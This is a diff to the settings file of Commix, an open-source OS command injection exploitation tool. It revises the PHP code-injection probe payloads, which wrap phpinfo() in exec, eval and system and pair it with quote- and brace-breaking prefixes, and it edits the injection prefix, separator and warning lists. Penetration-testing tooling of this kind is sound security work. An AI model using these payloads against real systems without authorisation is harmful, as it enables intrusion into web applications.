@@ -216,7 +216,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.4"
-REVISION = "11"
+REVISION = "12"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -256,13 +256,23 @@ INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
 
 #Basic heuristic checks for code injection warnings or... phpinfo page ;)
-PHPINFO_PAYLOAD = "eval(phpinfo())"
-PHPINFO_CHECK_PAYLOADS = ["print(" + PHPINFO_PAYLOAD + ")", 
-                          "test)'}" + PHPINFO_PAYLOAD + "'#",
-                          "'." + PHPINFO_PAYLOAD + ".'",
-                          "{${" + PHPINFO_PAYLOAD + "}}",
-                          "\\\\/{${" + PHPINFO_PAYLOAD + "}}\\/\\"
-                         ]
+PHPINFO_PAYLOAD = "phpinfo()"
+
+PHP_EXEC_FUNCTIONS = [ "" + PHPINFO_PAYLOAD + "", 
+  "exec(" + PHPINFO_PAYLOAD + ")", 
+  "eval(" + PHPINFO_PAYLOAD + ")", 
+  "system(" + PHPINFO_PAYLOAD + ")" 
+]
+
+PHPINFO_CHECK_PAYLOADS = [ 
+  [".print(" + x + ")" for x in PHP_EXEC_FUNCTIONS], 
+  [")'}" + x + "'#" for x in PHP_EXEC_FUNCTIONS],
+  ["'." + x + ".'" for x in PHP_EXEC_FUNCTIONS],
+  ["{${" + x + "}}" for x in PHP_EXEC_FUNCTIONS],
+  ["\\\\/{${" + x + "}}\\/\\" for x in PHP_EXEC_FUNCTIONS]
+]
+
+PHPINFO_CHECK_PAYLOADS = [x for payload in PHPINFO_CHECK_PAYLOADS for x in payload]
 
 # Executed phpinfo()
 IDENTIFIED_PHPINFO = False
@@ -270,7 +280,7 @@ CODE_INJECTION_PHPINFO = r"PHP Version </td><td class=\"v\">(([\w\.]+))"
 
 # Code injection warnings
 IDENTIFIED_WARNINGS = False
-CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort", "assert", "preg_replace"]
+CODE_INJECTION_WARNINGS = ["eval()'d code", "runtime-created function", "usort()", "assert()", "preg_replace()"]
 
 SKIP_CODE_INJECTIONS = False
 SKIP_COMMAND_INJECTIONS = False
@@ -371,7 +381,7 @@ JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&
 EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]
 
 # The code injection prefixes.
-EVAL_PREFIXES = [".", "", "{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
+EVAL_PREFIXES = [".", "{${", "\".", "'.", "", ";", "'", ")", "')", "\")", ");}", "');}", "\");}"]
 
 # The code injection separators.
 EVAL_SEPARATORS = ["", "%0a", "\\n", "%0d%0a", "\\r\\n"]
